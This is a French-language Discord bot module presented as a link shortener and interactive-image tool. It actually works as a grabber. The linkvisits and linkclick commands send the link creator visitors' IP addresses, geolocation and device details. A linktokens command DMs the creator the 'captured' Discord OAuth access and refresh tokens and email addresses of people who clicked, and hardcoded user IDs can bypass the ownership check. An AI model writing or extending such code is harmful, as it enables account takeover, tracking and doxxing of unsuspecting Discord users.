import discord
from discord.ext import commands
import sqlite3
import secrets
from urllib.parse import urlparse
import os
from dotenv import load_dotenv
import sys
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shortlink_server import click_codes

load_dotenv()
BASE_URL = os.getenv('BASE_URL', 'gifty.up.railway.app')
if BASE_URL and not BASE_URL.startswith(('http://', 'https://')):
    BASE_URL = f'https://{BASE_URL}'

class ImageNotificationView(discord.ui.View):
    def __init__(self, creator, image_url):
        super().__init__(timeout=None)
        self.creator = creator
        self.image_url = image_url
        self.notified_users = set()

    @discord.ui.button(label='🔔 Notifier', style=discord.ButtonStyle.primary)
    async def notify_creator(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in self.notified_users:
            await interaction.response.send_message('🔁 Tu as déjà cliqué.', ephemeral=True)
            return
        self.notified_users.add(interaction.user.id)
        dm_embed = discord.Embed(
            title='🔔 Nouvelle interaction',
            description=f"{interaction.user.mention} a cliqué sur ton image.",
            color=discord.Color.blurple()
        )
        dm_embed.set_image(url=self.image_url)
        if interaction.guild:
            dm_embed.add_field(name='Serveur', value=interaction.guild.name, inline=True)
        if interaction.channel and hasattr(interaction.channel, 'name'):
            dm_embed.add_field(name='Salon', value=f"#{interaction.channel.name}", inline=True)
        dm_embed.add_field(name='Utilisateur', value=f"{interaction.user.name}#{interaction.user.discriminator}", inline=False)
        dm_embed.set_footer(text=f"ID: {interaction.user.id}")
        dm_sent = True
        try:
            await self.creator.send(embed=dm_embed)
        except Exception:
            dm_sent = False
        if dm_sent:
            await interaction.response.send_message('🔔 Notification envoyée au créateur.', ephemeral=True)
        else:
            await interaction.response.send_message('⚠️ Impossible de notifier le créateur.', ephemeral=True)

class CreateLink(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.init_db()

    def init_db(self):
        try:
            conn = sqlite3.connect("links.db")
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS custom_links (
                    id TEXT PRIMARY KEY,
                    original_url TEXT NOT NULL,
                    user_id INTEGER NOT NULL,
                    guild_id INTEGER NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    clicks INTEGER DEFAULT 0
                )
            ''')
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Erreur lors de l'initialisation de la DB: {e}")

    def is_valid_url(self, url):
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except:
            return False

    def generate_short_id(self):
        return secrets.token_urlsafe(4)

    @commands.command(name='createlink')
    async def createlink(self, ctx, url: str):
        if not self.is_valid_url(url):
            embed = discord.Embed(
                title="❌ URL invalide",
                description="Veuillez fournir une URL HTTPS valide (ex: https://discord.com)",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        short_id = self.generate_short_id()
        
        try:
            conn = sqlite3.connect("links.db")
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO custom_links (id, original_url, user_id, guild_id)
                VALUES (?, ?, ?, ?)
            ''', (short_id, url, ctx.author.id, ctx.guild.id))
            conn.commit()
            conn.close()

            short_url = f"{BASE_URL}/link/{short_id}"
            embed = discord.Embed(
                title="✅ Lien créé avec succès",
                color=discord.Color.green()
            )
            embed.add_field(name="ID du lien", value=f"`{short_id}`", inline=False)
            embed.add_field(name="Lien court", value=f"`{short_url}`", inline=False)
            embed.add_field(name="URL originale", value=url, inline=False)
            embed.add_field(name="Créé par", value=ctx.author.mention, inline=True)
            embed.set_footer(text=f"Utilisez +getlink {short_id} pour accéder au lien")
            
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❌ Erreur",
                description=f"Erreur lors de la création du lien: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    @commands.command(name='createimage')
    async def createimage(self, ctx, image_url: str):
        if not self.is_valid_url(image_url):
            embed = discord.Embed(
                title="❌ URL invalide",
                description="Fournis une URL d'image HTTPS valide",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        embed = discord.Embed(
            title="🖼️ Image interactive",
            description="Clique sur le bouton pour notifier le créateur",
            color=discord.Color.blurple()
        )
        embed.set_image(url=image_url)
        view = ImageNotificationView(ctx.author, image_url)
        await ctx.send(embed=embed, view=view)

    @commands.command(name='getlink')
    async def getlink(self, ctx, short_id: str):
        try:
            conn = sqlite3.connect("links.db")
            cursor = conn.cursor()
            
            if ctx.guild:
                cursor.execute('''
                    SELECT original_url, user_id, created_at, clicks
                    FROM custom_links
                    WHERE id = ? AND guild_id = ?
                ''', (short_id, ctx.guild.id))
            else:
                cursor.execute('''
                    SELECT original_url, user_id, created_at, clicks
                    FROM custom_links
                    WHERE id = ?
                ''', (short_id,))
            
            result = cursor.fetchone()
            if not result:
                embed = discord.Embed(
                    title="❌ Lien non trouvé",
                    description=f"Le lien `{short_id}` n'existe pas",
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed)
                conn.close()
                return

            original_url, user_id, created_at, clicks = result
            
            cursor.execute('''
                UPDATE custom_links
                SET clicks = clicks + 1
                WHERE id = ?
            ''', (short_id,))
            conn.commit()
            conn.close()

            user = await self.bot.fetch_user(user_id)
            short_url = f"{BASE_URL}/link/{short_id}"
            embed = discord.Embed(
                title="🔗 Lien trouvé",
                color=discord.Color.blue()
            )
            embed.add_field(name="ID", value=f"`{short_id}`", inline=False)
            embed.add_field(name="Lien court", value=f"`{short_url}`", inline=False)
            embed.add_field(name="URL", value=original_url, inline=False)
            embed.add_field(name="Créé par", value=user.mention, inline=True)
            embed.add_field(name="Clics", value=clicks + 1, inline=True)
            embed.add_field(name="Créé le", value=created_at, inline=True)
            
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❌ Erreur",
                description=f"Erreur lors de la récupération du lien: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    @commands.command(name='mylinks')
    async def mylinks(self, ctx):
        try:
            conn = sqlite3.connect("links.db")
            cursor = conn.cursor()
            
            if ctx.guild:
                cursor.execute('''
                    SELECT id, original_url, clicks, created_at
                    FROM custom_links
                    WHERE user_id = ? AND guild_id = ?
                    ORDER BY created_at DESC
                ''', (ctx.author.id, ctx.guild.id))
                links_scope = "dans ce serveur"
            else:
                cursor.execute('''
                    SELECT id, original_url, clicks, created_at
                    FROM custom_links
                    WHERE user_id = ?
                    ORDER BY created_at DESC
                ''', (ctx.author.id,))
                links_scope = "au total"
            
            links = cursor.fetchall()
            conn.close()

            if not links:
                embed = discord.Embed(
                    title="📭 Aucun lien",
                    description=f"Vous n'avez créé aucun lien {links_scope}",
                    color=discord.Color.orange()
                )
                await ctx.send(embed=embed)
                return

            embed = discord.Embed(
                title="🔗 Vos liens",
                color=discord.Color.blue()
            )
            
            for short_id, url, clicks, created_at in links[:25]:
                short_url = f"{BASE_URL}/link/{short_id}"
                url_display = url[:500] + "..." if len(url) > 500 else url
                field_value = f"**Lien:** {short_url}\n**Cible:** {url_display}\n**Clics:** {clicks}"
                if len(field_value) > 1024:
                    field_value = field_value[:1020] + "..."
                embed.add_field(
                    name=f"`{short_id}`",
                    value=field_value,
                    inline=False
                )
            
            if len(links) > 25:
                embed.set_footer(text=f"Affichage des 25 premiers liens sur {len(links)}")
            
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❌ Erreur",
                description=f"Erreur lors de la récupération de vos liens: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    @commands.command(name='linkclick')
    async def linkclick(self, ctx, code: str):
        if code not in click_codes:
            embed = discord.Embed(
                title="❌ Code Invalide",
                description=f"Le code `{code}` n'existe pas ou a expiré",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        data = click_codes[code]
        creator_id = data['user_id']
        short_id = data['short_id']
        ip_address = data['ip_address']
        browser = data['browser']
        device_type = data['device_type']
        user_agent_str = data['user_agent_str']
        
        embed = discord.Embed(
            title="✅ Visite Enregistrée!",
            description=f"Votre visite sur le lien **{short_id}** a été enregistrée",
            color=discord.Color.green()
        )
        embed.add_field(name="👤 Utilisateur", value=ctx.author.mention, inline=True)
        embed.add_field(name="📱 Appareil", value=device_type, inline=True)
        embed.add_field(name="🌐 Navigateur", value=browser, inline=True)
        embed.add_field(name="🔗 Code", value=f"`{code}`", inline=False)
        embed.add_field(name="⏰ Heure", value=f"<t:{int(data['timestamp'].timestamp())}:F>", inline=False)
        
        await ctx.send(embed=embed)
        
        try:
            creator = await self.bot.fetch_user(creator_id)
            notification = discord.Embed(
                title="📊 Nouvelle Visite Enregistrée!",
                description=f"{ctx.author.mention} a cliqué sur ton lien!",
                color=discord.Color.blue()
            )
            notification.add_field(name="🔗 ID du lien", value=f"`{short_id}`", inline=False)
            notification.add_field(name="👤 Visiteur", value=f"{ctx.author.name}#{ctx.author.discriminator}", inline=True)
            notification.add_field(name="📱 Appareil", value=device_type, inline=True)
            notification.add_field(name="🌐 Navigateur", value=browser, inline=True)
            notification.add_field(name="🔍 Adresse IP", value=f"```{ip_address}```", inline=False)
            notification.add_field(name="⏰ Heure", value=f"<t:{int(data['timestamp'].timestamp())}:F>", inline=False)
            
            await creator.send(embed=notification)
        except:
            pass
        
        del click_codes[code]

    @commands.command(name='linkvisits')
    async def linkvisits(self, ctx, short_id: str):
        try:
            conn = sqlite3.connect("links.db")
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT user_id FROM custom_links WHERE id = ?
            ''', (short_id,))
            
            link_result = cursor.fetchone()
            if not link_result:
                embed = discord.Embed(
                    title="❌ Lien non trouvé",
                    description=f"Le lien `{short_id}` n'existe pas",
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed)
                conn.close()
                return
            
            link_owner_id = link_result[0]
            if link_owner_id != ctx.author.id and ctx.author.id not in [817179893256192020, 1294185155786838016, 1372200583284654210, 1203944242867863613, 934192303583674459]:
                embed = discord.Embed(
                    title="❌ Accès refusé",
                    description="Vous n'êtes pas le propriétaire de ce lien",
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed)
                conn.close()
                return
            
            cursor.execute('''
                SELECT visitor_id, visitor_name, ip_address, browser, device_type, country, region, city, timestamp
                FROM link_visits
                WHERE short_id = ?
                ORDER BY timestamp DESC
            ''', (short_id,))
            
            visits = cursor.fetchall()
            conn.close()
            
            if not visits:
                embed = discord.Embed(
                    title="📭 Aucune visite",
                    description=f"Le lien `{short_id}` n'a pas encore reçu de visite authentifiée",
                    color=discord.Color.orange()
                )
                await ctx.send(embed=embed)
                return
            
            embed = discord.Embed(
                title=f"📊 Visites du lien `{short_id}`",
                description=f"Total: {len(visits)} visite(s)",
                color=discord.Color.blue()
            )
            
            for idx, (visitor_id, visitor_name, ip_address, browser, device_type, country, region, city, timestamp) in enumerate(visits[:10], 1):
                visitor_info = f"**{visitor_name}** (`{visitor_id}`)\n"
                visitor_info += f"📱 {device_type} | 🌐 {browser}\n"
                visitor_info += f"📍 {city}, {region}, {country}\n"
                visitor_info += f"🔗 {ip_address}"
                
                embed.add_field(
                    name=f"Visite #{idx}",
                    value=visitor_info,
                    inline=False
                )
            
            if len(visits) > 10:
                embed.set_footer(text=f"Affichage des 10 premières visites sur {len(visits)}")
            
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❌ Erreur",
                description=f"Erreur lors de la récupération des visites: {str(e)}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

@commands.command(name='linktokens')
async def link_tokens(self, ctx, short_id: str):
    """Affiche tous les tokens récupérés pour un lien"""
    try:
        conn = sqlite3.connect("links.db")
        cursor = conn.cursor()
        
        cursor.execute('SELECT user_id FROM custom_links WHERE id = ?', (short_id,))
        result = cursor.fetchone()
        
        if not result:
            await ctx.send("❌ Lien non trouvé")
            conn.close()
            return
        
        if result[0] != ctx.author.id:
            await ctx.send("❌ Vous n'êtes pas le créateur de ce lien")
            conn.close()
            return
        
        cursor.execute('''
            SELECT user_id, username, email, access_token, refresh_token, ip_address, user_agent, created_at
            FROM oauth_tokens
            WHERE short_id = ?
            ORDER BY created_at DESC
        ''', (short_id,))
        
        tokens = cursor.fetchall()
        conn.close()
        
        if not tokens:
            await ctx.send("❌ Aucun token récupéré pour ce lien")
            return
        
        embeds = []
        for idx, (user_id, username, email, access_token, refresh_token, ip, user_agent, created_at) in enumerate(tokens, 1):
            embed = discord.Embed(
                title=f"🔑 Token #{idx} - {username}",
                color=discord.Color.gold(),
                timestamp=datetime.fromisoformat(created_at) if created_at else None
            )
            
            embed.add_field(name="👤 ID Discord", value=f"`{user_id}`", inline=False)
            embed.add_field(name="👥 Username", value=f"`{username}`", inline=True)
            embed.add_field(name="📧 Email", value=f"`{email or 'Non fourni'}`", inline=True)
            
            embed.add_field(name="🔑 ACCESS TOKEN (COMPLET)", value=f"```{access_token}```", inline=False)
            
            if refresh_token:
                embed.add_field(name="🔄 REFRESH TOKEN", value=f"```{refresh_token}```", inline=False)
            
            embed.add_field(name="🌐 Adresse IP", value=f"`{ip}`", inline=False)
            embed.add_field(name="📱 User-Agent", value=f"```{user_agent[:200]}```", inline=False)
            
            embed.set_footer(text=f"Capturé: {created_at}")
            embeds.append(embed)
        
        for embed in embeds[:10]:
            await ctx.author.send(embed=embed)
        
        await ctx.send(f"✅ {len(embeds)} information(s) envoyée(s) en DM" + (f" (Affichage des 10 premiers)" if len(embeds) > 10 else ""))
        
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

async def setup(bot):
    await bot.add_cog(CreateLink(bot))
